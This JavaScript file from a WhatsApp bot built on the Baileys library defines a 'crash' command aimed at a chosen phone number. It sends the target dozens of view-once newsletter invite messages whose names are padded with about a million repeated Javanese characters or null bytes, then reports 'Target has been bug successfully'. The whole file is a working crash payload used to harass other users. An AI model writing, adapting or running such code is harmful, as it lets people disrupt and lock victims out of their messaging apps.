import pkg from "baileys";

const { proto, generateWAMessageFromContent } = pkg;

import channelSender from '../commands/channelSender.js'

export async function bugs(message, client, participant) {

    const remoteJid = participant;

    var messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({

        'viewOnceMessage': {

            'message': {

                "newsletterAdminInviteMessage": {

                    "newsletterJid": `120363298524333143@newsletter`,

                    "newsletterName": "Dev Senku" + "ꦾ".repeat(1020000),

                    "jpegThumbnail": ``,

                    "caption": `Dev Senku admin channel`,

                    "inviteExpiration": Date.now() + 1814400000
                }
            }
        }

    }), {

        'userJid': remoteJid
    });

    await  client.relayMessage(remoteJid, messageContent.message, {

        'participant': {

            'jid': remoteJid
        },
        'messageId': messageContent.key.id
    });

}

export async function bug2(message, client, participant) {

    const remoteJid = participant;

    var messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({

        'viewOnceMessage': {

            'message': {

                "newsletterAdminInviteMessage": {

                    "newsletterJid": `120363298524333143@newsletter`,

                    "newsletterName": "Dev Senku" + "\u0000".repeat(1020000),

                    "jpegThumbnail": ``,

                    "caption": `Dev Senku admin channel`,

                    "inviteExpiration": Date.now() + 1814400000
                }
            }
        }

    }), {

        'userJid': remoteJid
    });

    await  client.relayMessage(remoteJid, messageContent.message, {

        'participant': {

            'jid': remoteJid
        },
        'messageId': messageContent.key.id
    });

}

export async function crash(message, client) {

    try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 30; i++) {

            await bugs(message, client, participant);

            await bug2(message, client, participant);

            await new Promise(resolve => setTimeout(resolve, 1000));

        }

        await channelSender(message, client, "Target has been bug successfully", 1);


    } catch (error) {

        console.error("An error occurred while trying to bug the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}
export default crash;